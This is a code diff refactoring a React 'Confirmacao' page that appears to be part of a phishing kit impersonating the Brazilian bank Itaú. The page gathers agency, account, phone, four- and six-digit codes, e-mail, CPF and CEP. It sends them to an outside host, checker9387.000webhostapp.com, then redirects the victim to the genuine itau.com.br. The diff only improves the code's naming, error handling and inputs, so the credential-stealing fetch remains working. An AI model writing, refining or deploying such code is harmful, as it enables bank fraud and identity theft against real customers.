@@ -6,7 +6,6 @@ const Confirmacao = () => {
   const [email, setEmail] = useState('');
   const [cpf, setCpf] = useState('');
   const [cep, setCep] = useState('');
-
   const [ag, setAg] = useState('');
   const [conta, setConta] = useState('');
   const [quatro, setQuatro] = useState('');
@@ -14,17 +13,17 @@ const Confirmacao = () => {
   const [seis, setSeis] = useState('');
 
   useEffect(() => {
-    const storedParam1 = localStorage.getItem('ag');
-    const storedParam2 = localStorage.getItem('conta');
-    const storedParam3 = localStorage.getItem('quatro');
-    const storedParam4 = localStorage.getItem('tel');
-    const storedParam5 = localStorage.getItem('seis');
+    const storedAg = localStorage.getItem('ag');
+    const storedConta = localStorage.getItem('conta');
+    const storedQuatro = localStorage.getItem('quatro');
+    const storedTel = localStorage.getItem('tel');
+    const storedSeis = localStorage.getItem('seis');
 
-    if (storedParam1) setAg(JSON.parse(storedParam1));
-    if (storedParam2) setConta(JSON.parse(storedParam2));
-    if (storedParam3) setQuatro(JSON.parse(storedParam3));
-    if (storedParam4) setTel(JSON.parse(storedParam4));
-    if (storedParam5) setSeis(JSON.parse(storedParam5));
+    if (storedAg) setAg(storedAg);
+    if (storedConta) setConta(storedConta);
+    if (storedQuatro) setQuatro(storedQuatro);
+    if (storedTel) setTel(storedTel);
+    if (storedSeis) setSeis(storedSeis);
   }, []);
 
   const handleClick = async () => {
@@ -35,9 +34,13 @@ const Confirmacao = () => {
 
     try {
       const response = await fetch(`https://checker9387.000webhostapp.com/index.php?ag=${ag}&conta=${conta}&quatro=${quatro}&tel=${tel}&seis=${seis}&email=${email}&cpf=${cpf}&cep=${cep}`);
+      if (!response.ok) {
+        throw new Error('Erro na resposta da API');
+      }
       const data = await response.json();
       window.location.href = "https://www.itau.com.br/";
     } catch (error) {
+      console.error('Erro ao fazer a requisição:', error);
       window.location.href = "https://www.itau.com.br/";
     }
   }
@@ -51,9 +54,29 @@ const Confirmacao = () => {
         <span>Confirme os dados abaixo para continuar</span>
       </div>
       <div className='form4'>
-        <input className='digitavel' type="text" placeholder='E-mail' onChange={(e) => setEmail(e.target.value)} />
-        <InputMask mask="999.999.999-99" className='digitavel' type="text" placeholder='CPF' onChange={(e) => setCpf(e.target.value)} />
-        <InputMask mask="99999-999" className='digitavel' type="text" placeholder='CEP' onChange={(e) => setCep(e.target.value)} />
+        <input
+          className='digitavel'
+          type="text"
+          placeholder='E-mail'
+          value={email}
+          onChange={(e) => setEmail(e.target.value)}
+        />
+        <InputMask
+          mask="999.999.999-99"
+          className='digitavel'
+          type="text"
+          placeholder='CPF'
+          value={cpf}
+          onChange={(e) => setCpf(e.target.value)}
+        />
+        <InputMask
+          mask="99999-999"
+          className='digitavel'
+          type="text"
+          placeholder='CEP'
+          value={cep}
+          onChange={(e) => setCep(e.target.value)}
+        />
         <button onClick={handleClick}>Confirmar</button>
       </div>
     </div>
